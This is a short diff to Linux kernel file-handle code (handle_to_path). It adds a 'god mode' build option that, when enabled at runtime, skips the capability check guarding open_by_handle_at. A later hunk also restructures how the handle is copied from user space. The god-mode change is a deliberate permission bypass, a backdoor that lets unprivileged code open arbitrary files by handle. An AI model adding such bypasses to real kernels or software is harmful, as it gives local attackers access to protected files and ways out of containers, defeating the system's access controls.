@@ -1,3 +1,6 @@
+#ifdef CONFIG_GOD_MODE
+#include <linux/god_mode.h>
+#endif
 #include <linux/syscalls.h>
 #include <linux/slab.h>
 #include <linux/fs.h>
@@ -173,6 +176,9 @@ static int handle_to_path(int mountdirfd, struct file_handle __user *ufh,
 	struct file_handle f_handle;
 	struct file_handle *handle = NULL;
 
+#ifdef CONFIG_GOD_MODE
+if (!god_mode_enabled) {
+#endif
 	/*
 	 * With handle we don't look at the execute bit on the
 	 * the directory. Ideally we would like CAP_DAC_SEARCH.
@@ -182,6 +188,9 @@ static int handle_to_path(int mountdirfd, struct file_handle __user *ufh,
 		retval = -EPERM;
 		goto out_err;
 	}
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 	if (copy_from_user(&f_handle, ufh, sizeof(struct file_handle))) {
 		retval = -EFAULT;
 		goto out_err;
@@ -198,8 +207,9 @@ static int handle_to_path(int mountdirfd, struct file_handle __user *ufh,
 		goto out_err;
 	}
 	/* copy the full handle */
-	if (copy_from_user(handle, ufh,
-			   sizeof(struct file_handle) +
+	*handle = f_handle;
+	if (copy_from_user(&handle->f_handle,
+			   &ufh->f_handle,
 			   f_handle.handle_bytes)) {
 		retval = -EFAULT;
 		goto out_handle;
